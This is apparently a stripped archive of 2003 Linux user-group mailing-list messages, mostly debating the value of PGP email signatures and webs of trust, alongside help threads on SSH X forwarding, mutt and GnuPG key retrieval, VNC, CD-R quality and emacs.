On the NFS server the files will be owned by userid "1001", since that is
the uid the files were created will (reported by the client).

Other clients will also see the files owned by userid "1001" since they
are now stored that way.

If jdoe logs in to the NFS server, he/she will now not be the owner of the
files since the uid is different.  User "1001", whoever it may be, will be
the owner of those files.

Message-ID: <200312071042.33484.carla@bratgrrl.com>

So what's the point, realio and trulio, of using PGP in email? I think 
it's a geek affectation. Anyone can generate a key. Anyone can paste a 
bunch of stuff in a message that looks like a key. If someone like 
David Mandel posted a message here that said "No more PLUG. I'm sick of 
it. We're pulling the PLUG hahahahaaa", it wouldn't matter if it were 
PGP-signed or not- no one would take such a message at face value. We 
would pick up and the phone and go "Yo, David, WTF?" 

So, aside from generating endless flame wars over how mail clients 
display a PGP sig, I just don't see the point.

  Well, wvdial is _supposed_ to be out of the box. :-) I've also built
chestnut-dialer, a python/Qt GUI interface. Gonna' give that a try but would
prefer the console's command line.

     For normal day to day emails, there's probably not too much of a
benefit using PGP signatures (ie. general banter or from a grandmother
to her daughter).  I guess it could be important to use if decisions
were being made to prove identity (ie. voting over something through
email), or if people often send code to be committed to CVS.  PGP
encryption, on the other hand, is very useful.  Cheers,

Daniel

For encryption or signing.

Encryption to keep the message secure, signing to verify the integrity.

Indeed. But it will be a different key.

What good would that do? The signature wouldn't verify the message,
and we'd all asssume it was forged or altered in transit.

Obviously not, since he probably wouldn't say such a thing, and
everyone is capable of kidding. You're missing the point of it, though
- - it's to verify that the person sending the message actually is the
one who sent the message, not to verify weather or not somebody is
joking around.

I don't have his phone number, nor do I expect he would appreciate a

  I tried to listen to an NPR story via mozilla-1.4. I downloaded the
RealPlayer-8.0 plugin and installed rpnp.so in /usr/lib/mozilla-1.4/plugins.
Now what do I do? The mozilla help files are rather useless.

  From the NPR Web site if I select an audio component (e.g., program
streams), the download manager opens and offers to download a .smil file for
me. How does this get streaming audio?

  Is there a HOWTO anywhere for this?

  OK. In ~/RealPlayer8/ is an executable. When fed the .smil file it plays
it. Now I'm satisfied. I suppose the streaming audio version of that file
provides a real-time connection to their site.

  So, now I know how it's done I'll return to my real life -- and try to get
the remote dial in working.

Check out RealPlayer's forum.  They have what you're looking for.

PS.  Did you restart Mozilla?  ...and there also might be a

Different from what? Someone generates their own key, and appears on 
this list claiming to be Joe Smith. What good is the PGP key? We have

The point is verifying the authenticity of a message, by whatever means 
are available, and it sounds you're saying PGP is completely 
trustworthy. I'm saying it' s not. Even if it is verifiably David's 
key, that only proves someone had access to his PC. 
 
Some Pluggers had fake ID as teenagers 'proving' they were 21. I don't 
see how this is any different. If you already have a web of 
relationships established, then youalready have ways of knowing if a 
message came from a particular person or not. If it's a total stranger, 
then I don't see where it's any better than any other form of ID, that 
can be faked.

  I didn't restart mozilla. There is /usr/lib/mozilla-1.4/plugins and I
copied rpnp.so there. If I am again moved to try to listen to audio via
mozilla I'll see if it works then.

  I see that you have taken to living upside down. Are you planning on

Many thanks,

Hence key-signing parties and web-of-trust. If David shows me two
pieces of ID and his pub key, I have a more reasonable expectation
that his signed messages come from him, if he takes reasonable
precautions with his private key, i.e. encrypting it w/ a strong
passphrase. If you and Eric and Russell and Jeme tell me a given pub
key belongs to David, and I trust you all and have your signed keys,
then maybe I somewhat trust that the key really is his.

Private keys protected by strong passphrases are the order of the day.

PGP strengthens those already established webs-of-trust and extends
them. Your example with David disbanding PLUG works because that
statement would be wildly out of character. What happens when a
forgery is more subtle?

I agree that PGP less useful for complete strangers. On some level you
have to depend on the stranger to protect their private key, or the
whole thing breaks down.

Message-ID: <Pine.LNX.4.56.0312071156500.20423@salmo.appl-ecosys.com>

  Am I correct in assuming that if X forwarding is set to "yes" in
/etc/ssh_config and /etc/sshd_config, then it's done automatically? That is,
an X app running on the server is displayed in X on the client?

  I'm wondering if this would be the most parsimonious way for my fiancee to
read and compose mail from her laptop. Easier than me trying to learn how to
properly set up an IMAP server for her use.

  My thought is to write a shell script attached to a panel button on Xfce
on the laptop. When she wants to read/write mail, the script would initiate
a ssh connection to 'salmo', she'd enter her password, then have slypheed
run on 'salmo' (while I'm running X on the same machine) but display on her
laptop. I assume that in the script I'd need to tell sylpheed to use 1: for
an X display because 0: is alreay in use.

Make any sense to you gurus?

None. See the GnuPG Handbook section on key signing and trust
relationships. That's what makes the PGP keys useful for identification.

Or your own eyes and ears.

And even if the key does you no good for identity verification, it is

Completely trustworthy? Nothing is.

But remember, OpenPGP is a standard, GnuPG is the implementation (that
I'm using, anyway). You are welcome to verify the GnuPG source for
yourself if you don't trust the implementation. You're welcome to code
your own as well.

As far as the standard, and the algorithims it employs: they are some
of the best we've got right now. Completely trustworthy? Nah...
Cryptographically secure (by reasonable definition)? So far as we
know, yes.

Yes. And tortured him for his passphrase (which *should* be long
enough that people aren't going to guess it or brute-force it any time
soon).

And if someone else did have access to his key (and assuming that he
knows about it), he should be busy generating a revoker right now.

|
| Some Pluggers had fake ID as teenagers 'proving' they were 21.


Poor analogy. A signed key is *much* harder to forge than a signature
or a card (some would say impossible, but I won't argue that).

Because you're thinking purely in terms of identification
verification. In that circumstance, you're right. A key is basically
useless for indentification without being signed (weather by you or
through a web of trust).

However, consider this:

We've likely never met in real life. There is no face assocaited with
this name. Yet, these messages consistantly come from the same public key.

Lets say I've been forging somebody's identity all along. Does it
really matter? So you can no longer trust the name that's assocaited
with a given key. Big deal! You couldn't trust it before.

You can still trust the key's fingerprint, and the signature. You
still know that, whoever the hell I am claiming to be on a given day,
I'm still the same person typing the email.

Assuming, of course, that I've kept my private key secure. ;)

Weather or not you actually know this message came from me, or someone
claiming to be me, you still know it was sent by key id 0E7428ED with
fingerprint 6ACE BFFA 6584 C3FE C95A DAF4 568F FF44 0E74 28ED. Even if
you can't necessarily verify who a person is, you can verify that it's
still the same person.

Finally, even an untrusted unknown key can be used to ensure that a
message arrives fully intact, and has not been altered in transit.

No. You also need to specify -X on the command line:

ssh -X remote_host.

Let's use the terms "remote host" and "local host" - client and server
is too confusing when talking X, because remember, the server runs on
the "client," and the clients are the programs running on the "server" ;)

The application runs on the remote host (what you called the server),
and connects to the X server (what you called the client) on the local
host which draws the client's (in this case, by "client" I mean an X
client - the piece of software running, be it Mozilla or GAIM)
information to the display.

SSH should set up the DISPLAY environment variable on the remote host
for you, so that the client (again, software) knows where to connect.
That port will, of course, be forwarded to X running on the local
host. SSH will also take the liberty of setting up your .xauth file so
that the client (software) is allowed to access the server (X server
on local host).

IMAP isn't hard to set up. If even I can figure it out, it should be
cake for anyone else.

Besides, X isn't too great if you end up in a situation where you're
stuck on a modem or something... (sorry, I can't remember if that was
one of the criteria on your original email regarding this question.)

Er... I'm sorry. I misread. If you specified it in ssh_config *as well
as* sshd_config, than yes, it's done automatically.

Just be sure you're talking about the ssh_config on the local  host
and the sshd_config on the remote host - changing both configuration
files on the local host won't get you anywhere, and changing both on
the remote host will still require -X on the local host...

Speaking of which, the new version of Mozilla Thunderbird 0.4 was just
released yesterday.  For those that don't know, Mozilla has been
breaking apart their web "suite" into stand-alone components.  Mozilla
Firebird is the web browser (very good and pretty fast in my opinion)
and Thunderbird is the email client.

If I know the other end is likely to be using Outlook, I just switch to
my S/MIME signature, which does work fine.

Do you have a howto on how to sign using S/MIME?  Maybe even automate
it in mutt to do it automatically when it see's Outlook Express's
User-Agent header?

Oh yeah... it's also not usually a good idea enable X forwarding in
ssh_config. If you abolute musn't use ssh -X for some reason, at least
use the user-specific configuration in the user's home directory.

  Aha! Many thanks, Daniel. I had no idea what the different animals
represented. So, I suppose, one could run only "firebird" and save the disk
space of the full mozilla suite.

If you Google, there are results on it. It's not an .... easy ...
process. :-( Most of the difficulty lies in extracting the certificates
and chain of trust from the files given to you by your CA. Presumably if
you could find one that's more OpenSSL friendly, sailing would be
smoother. The second difficult part is understand which directories the
S/MIME patch wants the files in, as the documentation is a bit hazy
there.

When I find time, I shall have to sit down and explain it, if you want.

(BTW, Thawte will give you a personal email cert for free, and you can
go and get it signed by people to create a web of trust like GPG.)

Oh, and I remember (and just went and looked) that there is an example
rc block in Debian in /usr/share/doc/mutt/examples

>  Maybe even automate

I tried just now, and apparently in the current incarnation of Mutt,
it's not possible to do general header matching on reply. (It's possible
elsewhere, though.) It is, however, relatively easy to switch on a
per-address basis.

At the top of your -hook blocks, add the following:

send-hook . "unset smime_is_default"

then later, add something like:

send-hook "~C billg at microsoft.com" "set smime_is_default"

Alternatively, as discussed further down in the thread, you could
establish send-hooks to only use traditional when sending to your
mother.

You will note that mutt will force PGP/MIME if the message it is
replying to is not us-ascii. Which Outlook rarely is. So you could have
mutt just automatically not sign. (Which seems reasonable given that she
can't do anything with your signature anyways.)

I thought Jeme made an interesting point a few weeks ago, about the
pieces of ID being more or less superfluous in this situation.  If you
recognize the person standing in front of you as the person you think
it is, then it really doesn't matter who the State thinks they are.

That said, and just to blurt out something that has been bouncing

does much for me, at least not directly.  I might _want_ to maintain
some ambiguity about what I did or didn't say (particularly when my
jokes aren't funny).  Signing messages is primarily a service to the
recipient, and only through that service, indirectly a service to the
sender.

To quibble on fine (but important) points:

Authentication is simply the process of verifying identity, e.g., the
user has the password right or has the right SecurID card.

Authorization is the process of mapping a user identity to their rights
to access files. Presumably it makes sure the identity is authenticated
first, but it is not required to (such as in our case of NFS < v4).

Sometimes it is also worth seperating the concept of a Directory as
the database that maps textual user identities to machine readable user
identities (such as username to uid).

Understanding the difference between authorization and authentication
helps to understand why Microsoft's abuse of Kerberos 5 packets for
the purposes of Active Directory is a bad thing.

Again, just quibbling. The important thing from the entire thread is:
Yes, you have to synchronize. :-)

Rich,

We use VNC to run programs on our compute servers. X-forwarding in ssh
sometimes works, sometimes doesn't.  VNC also has the advantage of being
able to disconnect without loosing the session. She comes home and runs
vncviewer and she is right back where she left off.

Warning:  VNC is also inherently very bandwidth intensive (it sends full
images over, or parts that have changed depending on how configured, as
images, not descriptions of images).  You can get around this with
TightVNC, but it uses lossy compression (colours different than
original, poorer quality, etc.  VNC also starts an instance of X for
each session running.  This can be very memory intensive for the system
serving.  I'm not exactly sure, but (as an example) I believe that if
you have a regular X session running Gnome and you start a VNC session
running Gnome, it doesn't share the Gnome libraries in memory?  Anyone
have more insight?  Cheers,

Daniel

Ken,

  Her only computer use is here, in the house. Besides, I got the mail
working! (Yea, team!). See that thread for details.

Many thanks,

Brent,

  I worked out a solution that's equivalent, but was quick and painless.

  Taking your message as a starting point, I found the RH 7.3 imap package
on rpmfind.net. Downloaded it and discovered that it was already installed.
All services turned off.

  Read the imap README and got that running on `salmo'. Tried to connect
from `pachy' (her laptop) and sylpheed would do only POP3. Shrug. Shut off
imap and fired up POP3 on `salmo'. Sylpheed now reads mail from
salmo:/var/spool/mail/<username> while running on `pachy', too. Whew!

  Now she has her four applications (mail, Web browsing, OpenOffice.org and
jpilot) all set up on the desktop of her laptop and can work in the den at
the rear of the house. We just need to remember to not trip on the 100' cat5
cable snaked across the floor. :-)

  Thanks to all of your. I learned a lot -- and was massively lucky -- this
weekend. Now to ensure that /dev/modem links to the proper device on my
laptop and I'm all set there, too. Now, back to the new workstation/server
....

That can be a disadvantage, too.

Also, if you are going to be running VNC, you should be tunneling it
through SSH (just as you should with X).

But not anybody can get their key signed.  You have to have a web of

Not that anybody would be able to do anything with it.

But if David Mandel had usually signed with a key that people who met
him have signed his key (legal ID and face-to-face interaction is
expected when you sign keys) could go, "OK, I can totally ignore this
non-issue, it's not actually David."

For private messages, it's also nice in the fact you can encrypt your
message to ensure only the intended recipient is able to view it
thanks to the wonders of public key encryption.

GnuPG is extensively documented.

Until someone has met him, checked ID and signed his key.  Then, once
the newly signed keys are uploaded to keyservers, from finger, or
encoded in an email (what you see on this message is just a signature,
not a key), anybody who trusts the people that keysigning know by
proxy that Joe Smith really is who he claims he is.  Needless to say,
this only works as well as the people in your web of trust: It's
absolutely imperative that you understand how to properly use GPG or
PGP before using it.

Not specifically, no.  We know that someone has gained access to both
his private key and his private key password.  This isn't usually
where public key encryption breaks down, though.  Most people using
such systems protect their private key well, and don't go writing down
their PGP passwords for the same reasons they don't go leaving their
ATM cards around with their PIN numbers written on them.

GPG cuts way back on the whole social engineering aspect.

You know, I have two problems with this whole discussion, and they're
both in implementation. Maybe I just haven't looked through the
documentation fully enough, but I cannot find (for evolution, and mutt,
though I haven't looked as much for mutt) a way to do either of these
two things:

1) semi-automagically store public keys on users who send me signed
emails, and truly automagically verify emails from users who have
already sent me emails, and

2) have a way, as I'm sending an email, to decide not to sign the email.
The only way I can find in Evolution is to change the actual settings,
which takes a while.

Plus, with lists, the emails _do_ get changed in transit, and so the
verification probably cannot be done automagically easily, as the
verification software needs to know how the emails should be changed to
get them back to verifiable state.

This can be handled by gnupg with ~/.gnupg/options:

keyserver-options auto-key-retrieve

It will download the key from the keyserver and use it to verify the
message. You need to be a member of the web of trust or have signed the
key directly, though.

I haven't figured out how to have mutt automatically get a GPG pub key
either.  Especially since most people don't have anything, either in
headers or signature, stating where to find their pub key.

With mutt you can setup a "send-hook" so that if you are sending an
email to plug at lists.pdxlinux.com it will not automatically sign a
message.  Or you could do just the opposite and have mutt setup not to
sign automatically but have a send-hook to sign for the email address.

I haven't noticed a problem with this.  When reading my own emails sent
to this list the GPG verifies correctly.  Now, I'm not sure if that is
because of the priv or pub key though.  Perhaps a GPG/PGP guru could
answer that more better.  :-)

Do I also have to have a keyserver URL in the ~/.gnupg/options file as
well?  When I try ^K in mutt, which according to the docs should get a
PGP key, it gives me the following:

   gpg: NOTE: old default options file `/home/brian/.gnupg/options'
   ignored
   gpg: no valid OpenPGP data found.
   gpg: Total number processed: 0

Any ideas?

Yeah, probably:

Yeah, oops. I meant to address this in the other reply.

Simple: You only sign the body of the message. Then an MLM can change
the headers to its heart's content; or add additional MIME segments with
"Unsubscribe here" URL's, or whatever. You do need to be careful not to
always trust the From: line. I *believe* mutt crosschecks these, however.
I know it does for S/MIME.

Sure, but not only disk space... Firebird is much quicker than Mozilla. 
IMHO, it's an all-around better browser.

Did it bail out at those or continue on to completion?  If you were able

That looks, to me, like you have a mismatched include file version or
something.  It's either looking for a specific Berkeley DB version, or
wants some other DB headers that aren't Berkeley DB... but I think it's
Berkeley DB they're looking for... what versions do you have installed?

Does the output if ./configure --help list anything about Berkeley DB? 
If so, try disabling it and see if you can get any further... I wonder
if you really *need* this wvbdbhash (WVdial Berkeley DB Hash?)...

Wait, it's supposed to be out of the box, as in Pat includes it on one
of the CDs?  Then why not use Pat's build of it?  :-)

This one's a function of GPG.  Edit ~/.gnupg/gpg.conf to include...

keyserver x-hkp://pgp.mit.edu
keyserver-options auto-key-retrieve

...and after that, GPG will try to retrieve public keys when it

This is done in mutt automatically on messages using PGP/MIME style
signatures.  Inline signatures can be verified in mutt with Esc-P

In mutt, on the confirmation screen, you have this option.  Hit P f
(for (P)GP and (f)orget it).

Yes, but if you notice, you can tell by what PGP adds what part of the
message PGP will be verifying.  The only changes you can really make
in transit is adding things after the signature.  The part that's
signed is still good, just there's some extra unsigned stuff after.

Well, you can always ask other PGP users to send you a copy of their
key.  You can do so in mutt with Esc-k.  You can import a key from
email with C-k

This is because PGP only verifies what's within it's boundaries.
Headers and anything appended to the end after signing aren't signed
and don't bother PGP any.

Mutt's a pretty model implimentation of a MUA.  You can generally
trust it to do the right thing with the default settings.

  db1, db2, db3, db4. :-)

  I wondered why it's looking for the Berkeley DB, but I've no idea what
wvstreams needs a database for.

  Oh, no. It's not on any CD-ROM. I thought you meant it should build and
run on any system.

  The laptop's off now so I'll check tomorrow morning to see what configure
has to say about it.

Even after editing ~/.gnupg/gpg.conf I still can't get mutt to download
a pub key.  Still getting the same error as before:

   gpg: no valid OpenPGP data found.
   gpg: Total number processed: 0

Anything else that I need to edit or otherwise mess with?

It's not a good signature at all, the signature itself is borken or fake.

Probably not a good thing to do considering all the "interesting"

I guess that means that my chewing on broken CD shards over the years
probably wasn't a good thing then.  :o(

This is after trying C-k on an email from you.  So, I doubt that the
signature is broken or fake.  What could be the problem?  Perhaps the
"pgp_import_command" in .muttrc?  I have it set to:

   set pgp_import_command="gpg --import -v %f"

Does that look right?  Or am I even looking in the right direction?

Great, but that still doesn't explain how this is a better banner ad
solution that just using /etc/hosts.  See what I mean?  Two whole
packages versus one text file.

In past years, we have been at ITEC.  This year I've been working long
hours and haven't had time to do much of anything.

However, Ed Sawacki <ed at alcpress.com> has been very involved with ITEC.
In fact, I suspect he could use some help.

In any case:

    (1)  You can probably get into ITEC for free.
         At least, you can probably get into the exhibits and the talks
         which are given in the exhibit area.
         I have appended a copy of the notice ITEC sent me which includes
         their URL and Priority Code (ZZAREM) to register on-line.
         It that doesn't work, contact Zot O'Connor <zot at whiteknighthackers.com>
         He has extra tickets.

    (2)  Also, the last time I talked to Ed he needed lots of help.
         I don't know.  He may even need speakers yet.  Any way,
         contact Ed at Ed Sawacki <ed at alcpress.com>.  I'm sure he can
         get you in if you are willing to work at bit.

    (3)  Ed has also been putting together a booth in the exhibit area
         to represent Biznix and PANUG and other other Open Source Groups,
         including PLUG, MWVLUG, and ELUG.  If you would like to help
         him man this booth contact ED at ed at alcpress.com.


    I didn't give you phone numbers for either whiteknighthackers.com
or alcpress.com, but complete contact information is on their web sites.


                                          Sincerely,

The online CD-R Faq used to have a lot of good information. They
reviewed a freeware windows CD ID program from Germany that would scan
the CD-R and report if it used the long or short term longevity dyes.
I downloaded the program and it worked as advertised.

The long longevity CD-R's were usually limited to HP, Sony, Fugi, and
Maxwell Pro. I haven't seen a HP disk to test for years and Sony went
to the cheap dyes when the speed went up (If I remember right, when
they went to 40?x something) earlier this year.

I haven't tested CD-R's much with it for a while because it only
worked in Windows 98, not 2000 or XP that I normally use at work, so I
would buy a lot of disks when they passed and not have to go to a
Windows 98 machine much. 

When we were running low on disks a few months ago I tried to install
it again in XP and surprisingly it worked! Must be some XP update that
made it work. The bad part is first I went to look for an updated
version of the program. The online CD-R Faq no longer listed anything
about it! I went to the site in Germany and it was not mentioned there
either, just his other programs. It got me thinking that maybe the
CD-R manufacturers wanted that program gone before it was general
knowledge (I just checked the site again and it looks like the
programmer has dumped the domain).

If anybody wants the CDR ID program  just send me an email saying so.
It's 109KB in the zip file. Maybe someone here can figure out how it
works and write a version for Linux.

Here is a description from the program:

Background information:

This small tool was developed to read the ATIP from a CDR media
using a CD recorder - right now there?s no CDROM reader that can
do this (At least I don?t know of!).
The ATIP tells who has manufactured the disc and what dye type
they used. (The ATIP doesn?t tell the exact dye type - it just
tells if the recording strategy to be used for this media is
a "long strategy type" (e.g. Cyanine) or "short strategy type"
(e.g. Phthalocyanine).

I googled for "list of ad servers" and got a bunch of useful-looking

informative, tho written for Windows users.  In Linux, the hosts file is
/etc/hosts.

Michael,

You probably promised only file server access, but are you aware of
RealVNC and TightVNC, two compatible PC-Anywhere type applications for
Windows and Linux?  If not, Google both those words &/or check out
http://www.linuxworld.com/story/32625.htm and then
http://www.gregmartyn.com/computerhelp/tightvnc.html
The problem you may encounter with any server (VNC or FTP or ...) on
DHCP is finding out the IP address from "outside", since Qwest may
assign a new one at times. To work around that, read
http://www.gregmartyn.com/computerhelp/dyndns.html & follow the links to
dyndns.org to set up a way to access your server by name (dyndns.org)

Surely they are on some kind of router/firewall, so read at
www.dyndns.org about how to set up the firewall to let outside
connections in to the server for specific ports (like the FTP port or
the VNC port).

I am just in the middle of setting this up myself, so can't guide you
any further at this time.  Perhaps others on this list can?

A good debugging technique is to run sshd in debug mode *ON ANOTHER
PORT*

sshd when run as debug does not create a fork, but dumps to the
terminal.

so something like 
        sshd -p 2222 -d

Then connect with
        ssh -v -p 2222

One nifty thing you can run this as a user, and only log in as that
user.  It traces perms issues down. Warning, some system make /etc/ssh*
not world readable.

To some extent this is true, but for a long time it could have been said
about email in general....

Yes, but the difference is the key will verify *that* email as being
generated by *that* keyholder.  That is a huge difference.  Faked email
with a faked key will be able to *be proved* to be fake.  Currently
faked email can be demonstrated to *likely be* faked.

As signed email becomes the norm, it can be used to fight spam, allow
access to lists, and demonstrate reliable transmissions.

But anyone can test if its a real signature.  Those who do check, will
know immediately.  Those who don't will not care.  This would be a
stupid thing to do.  It only tips off more people.

You are pointing out how real trust works, it is built over time through
a Bayesian-like system of event storage.  You have an expectation of
mail from "David Mandel" and this would not fit.

On the other hand if someone claimed that people were posting under
false creds, say as Wil, then he can point out he always posts with with
a signature.

If all email clients settled this, and they can, then the de facto
standard could be signed email.  A PGP/GPG signature adds very little
overhead to the transmission (unlike S/MIME), and adds lots to
reliability, verification, and forensics.  These are issues that become
important, when their qualities become commonplace and expected.

But until the email clients settle the standards issues, it is an early
adopter/high needs thing.  Arguing over the client issues is an
important part of the standards process.

Most setups have X forwarding on by default.

A great way to test is run xlogo.  

On it working versus not working, that is almost always a DNS issue in
setting up the auth variables.

Alright, I get it.  So the sender has to actually attach the public key
to the email for mutt to be able to get it.  I thought that mutt would
be able to tell GPG to fetch the public key with ID foo from
pgp.mit.edu.  That answers my questions, thanks guys for all the help!
Now I just need to meet some of you so I can sign some keys.  (That
might be hard though, living in CT and all.)  ;-)

Yeah, any time it needs your private key (such as for signing), it will
prompt for a password. It will then hold on to it for pgp_timeout
seconds (defaults to 5 minutes).

I ran across this site full of useful information about media, including
some rather punishing error rate tests.  They won't tell you anything
about longevity, but say a lot about initial quality.  Look at the "CD-R
Benchmarking" section at the bottom of this link:

or go straight to:

http://www.digit-life.com/articles/cdrdisktestp4/
http://www.digit-life.com/articles/cdrdisktestp5/index.html

Unfortunately for me, the exact same media that I've had some recent
problems with (Imation 16x) were the top rated in the CD-R roundup part
IV.

You can set it to default off, or default on if you so wish.

I don't generally sign emails because of the readability factor for the
great masses with broken mail clients... Evolution only signs PGP/MIME.

Mutt *can* use GPG to fetch it... 

With that auto-key-retrieve setting in your GPG Config file, when you
ask it to verify something signed with a key that is *not* in your
keyring, GPG goes out and finds the key if it's on the keyserver, and
automagically imports it, then it verifies the message.

So don't tell Mutt to import a key, tell it to verify the message as if
you already had the key.

Lots of other good talk, but here's a real-life example of a good reason to
sign your keys:

We had a key signing party down near U of O a few years ago, and this guy
(I'll call him "Bill") was telling us a story about the divorce he was going
through. Seem like the lawyer for his wife was trying to "help" her by
changing the text of the emails that the lawyer got from Bill.

Bill was a fastidious PGP user, signed all his emails. When the lawyer
brought up the changed emails as evidence during divorce procedings, Bill
had him verify the signatures. They didn't verify and Bill told the judge
about the sigs and what it meant.

This is one reason for signatures. For encryption, it's not too different in
concept from an envelope.

  I disagree.  It sounds like someone was using crap cameras or too much
video compression.  Digital cameras have gotten a lot better and come down
in price.  Storage is cheep.  There's no reason that a digital surveillance
system shouldn't be at least as good as an old analog system.  You also get
the benefited of using the GIMP or Photoshop to manipulate the image.  

  It's not just for video.  Some of the V4L projects do motion detection
with still cameras.

You can get SuSE installation disks on Ebay, as I did,
but apparently installation instructions are not to be
found without a boxed set, even on the Web. (Constrast
this with Red Hat's documentation, available in .pdf
format.)

Anyhow, there are several installation options on
SuSE's welcome screen, and I am not quite sure which
one to choose. I have partitions already prepared for
the installation, and want them mounted according to
my specifications. Yet I would like to have the
hardware detected automatically. Is the "manual"
installation option the right one to use?

Good link, thanks.  I'm researching this for a friend that just had a baby 
and wants to set up cams around the house that stream to a local webserver. 
  Searching freshmeat can be annoying at times.  This site is organized well

You mean *strictly* other than editing/coding files? :-)

Like, web, irc, terminal shell, tetris, eliza... :-)

As far as what I *use* it for? I wouldn't code any other way. I have
context-sensitive manpages at my fingertips, doxygen lookups, etc;
function prototype hints, single click file load for #include's, project
file/object/function browsing. I love using it for LaTeX --
auto-complete environment blocks, reftex automatic label management,
x-symbol gui visualization of mathematics, even a microsoft-like
autospell highlight mode.

And, of course, personal customization using a very capable lisp
environment.

I do recognize that probably vim does a lot of the same. I just like
emacs better. I do use vi for tweaking config files (and apparently
writing email, though I'd rather find a better solution with mutt).

I use the psgml mode in conjunction with xmllint to edit and verify
DocBook XML files. I'm becoming increasingly addicted to DocBook, and
Norm Walsh's beautiful XSL stylesheets, and wouldn't be nearly as
productive without emacs.

I use it for viewing images (auto-image-file-mode), word processing
(latex-mode), writing email (through mutt), file management (dired),
lisp programming -- and running/debugging (lisp-interaction-mode), it
serves as my shell on occasion (M-x shell is handy in this case), the
calendar (M-x calendar)--although not the schedule features--and the
occasional game of tetris (M-x tetris).

I would like to use it as a window manager, but it needs to support
embeded X apps in emacs windows first.

I don't use it to edit config files very often though.. I prefer vi[m]
for that.

The SuSE installation disks on Ebay are illegal if they are copies and
the person providing them charge for the disks. 

It doesn't matter which install method you use. Manual is a bit harder
if you don't know your hardware. All the installs allow you to setup the
disks how you want.

You'll find the manuals can be installed off of the CDs. The are rpms so
you'll need something to install them on. I think most people will find
the install is pretty easy and won't need the manuals until after the
install.

Never mind. Just got off my duff, set up a permanent xemacs on a
screen, and switched bindings of C-x C-c and C-x # so I could use
gnuserv in a sane fashion. Yay.

Can't say if it's best or worst, but I've been using ipcheck for a

Slices, dices, and juliennes!  :-)  No email or newsgroups but as much
code and data editing as makes sense.  The perl, HTML, java(script), and
other modes make my life much easier.  Being able to program as set of
keystrokes and commands on the fly and regular expressions for search and
replace help a bit too. I do use vi for quick editing but since I have
never gotten to much into it's feature capabilities I stick with what I 
feel comfortable using.

Thank you Steve, this looks like what I was looking for!  ZoneMinder
uses zones on each camera for the motion detection, just what I was
dreaming of.  It also looks like the resources were well thought out.  I
hope it works.

Thanks again.

Hello,

It looks like I downloaded a bad BIOS image from my mobo manufacturer
(a fact their "tech" support confirms). They're offering to rma my board,
 but the turnaround time is three plus weeks and I don't want to wait
that long. Does anyone know where I could get a PLCC format Award BIOS
chip reprogrammed in the Portland area?

Thanks in advance,
Matt

I use the no-cost F-Prot for linux scanner.  Fridrik Skulason, the founder
of Frisk Software, has consistently supported a low or no-cost virus
scanner, kept as up-to-date and complete as anyone else's.

Virus signature updates are available via their FTP site.

If you want a Windows version with real-time resident scanning, it's $29
per year.

Dave Mandel is the one to talk with about Emacs. In his days at the BLM,
he wrote a number of Emacs Lisp scripts to clean-up text based GIS data
files. I think he may have written some sort of daemom process that used
Emacs to transfer files between the Novell server and a Prime. At one
point, He even hooked me into writing Lisp scripts to find problems in
very large (for the era) DXF files.

Until ViM was available, I used plain ol' `vi' for *nix and elvis for
windoze. Now it's ViM all the way, it just plain rocks.

No, you can also set GPG up to automatically fetch keys from
keyservers as I described upthread.

Mutt passes it off to GPG, and if you have GPG set up as I suggested
upthread, it will get you keys if you don't have them and if they're
on the keyserver.

Sign keys with people you know locally, and as you and people you have
signed keys for (and so on and so on) sign keys, your web of trust
will grow.  Needless to say, a firm understanding of how it all works
should be considered mandatory before you start signing other people's
keys.

  For config files and other admin tasks I use 'joe'. It has the ol'
WordStar, emac-ish keybindings so it's quite comfortable after 20+ years of
editor use with those keybindings.

I can already see that among OpenPGP users except for fight spam.  You're
asking more than OpenPGP can deliver, there.  OpenPGP will only give you
the same assurance it already does for unknown keys:  It wasn't
altered in transit.  And it won't even do that if they haven't sent
their key to a key server.

And yet, that very thing was attempted over the summer on some of the
newsgroups I read regularly.  Funny watching all the OpenPGP users
turning around and laughing in the face of that one.

It's already settled, it's just waiting for older and borken clients
to get with the times and implement the standard defined in the RFCs
for this (PGP/MIME).

Bickering over which format is pointless at this point, it's a done
deal.  Those who are developing this stuff have long since had this
flamewar and formalized it.

I remember back in the mid-1990s the conservatives were all pissed off
about encryption and it's effects on national security.  They wanted
to outlaw encrypted email.  Ironic considering even they know the
postal service requires mail to be wrapped.

Message-ID: <1070936159.11639.46.camel@dell.linux.box>

I am continually astounded at the sheer lack of intelligence so many
ISPs exhibit.

This morning about about 10AM, Web-ster, my ISP (and only choice for an
ISP), began blocking outbound connections to port 25.  As a result, none
of my emails were getting out.  I didn't realize what was happening
until about 16:30.  I added their SMTP server as a relayhost to my
main.cf at about 16:45 as soon as I had the problem diagnosed.

But... what the *hell* are they thinking?  Are they just trying to screw
with me or what?  I sent a rant to their technical support department,
hopefully I will receive an answer tomorrow.

This ISP just plain sucks.  The speeds suck.  The reliability sucks. 
The only advantages are they're too stupid to set up dhcpd so I get a
static IP and the AUP (which I never actually agreed to) doesn't mention
anything about running servers.  But, still... blocking outbound port
25?!?

Is this common practice?  I have a friend down in Mississippi with
Comcast who has the same problem... he was able to help me quickly
figure out what's up.

*Sigh* ... I'm so disgusted with Web-ster......

Well that's the point, isn't it? If it's the norm, then it's rare to
encounter unknown keys from outside the web of trust. And if someone
violates the trust given to them by sending spam, their signatures are
revoked. It's a thought, anyways.

Well, their signatures wouldn't be revoked, but everybody could just
set their trust level with that person to be untrustable.

Earthlink does that to me as well, presumably to reduce spam.  Took me a
minute to realize why I couldn't send through my own server in Texas. 
Maybe they sent a warning to via their own email service, but you didn't
notice, because you use your own?

Yes, back in the old days I did many things with emacs.

    As well as the programs Dan mentioned, I wrote large complex key
binding system which contained quite a few custom functions that were
lacking in standard emacs.  This key binding system worked well in it's
day and age; but is no longer of value because of major improvements in emacs.

    I also wrote a number of screen oriented data entry programs using
emacs.  These also worked well.  They were designed to edit complex
ASCII files, where it was important to know what field was where and
if a given input value was reasonable.  In addition, the data entry
program computed certain fields based on other fields as the user
entered them.  This was sort a cool application.  At least, my client
like it.  In particular, the client liked the fact that it was much
much faster to use than the traditional data base forms based screens.
It also gave the client more flexibility to do cutting and pasting
and to ditto fields from one record to the next.  In fact, as I recall
I even had fields that could be dittoed with an increment added to it.

    I recall yet another of my emacs applications.  I used emacs
shell and/or telnet mode to run command line programs - especially
MOSS and ArcInfo.  By doing this I could use emacs lisp to write
macros for MOSS and ArcInfo.  ArcInfo comes with it's own scripting
language, called CPL.  However, emacs lisp is faster and much more
powerful than CPL.  This system worked great; but for some reason
I never convinced many users to adopt it.

    In any case,


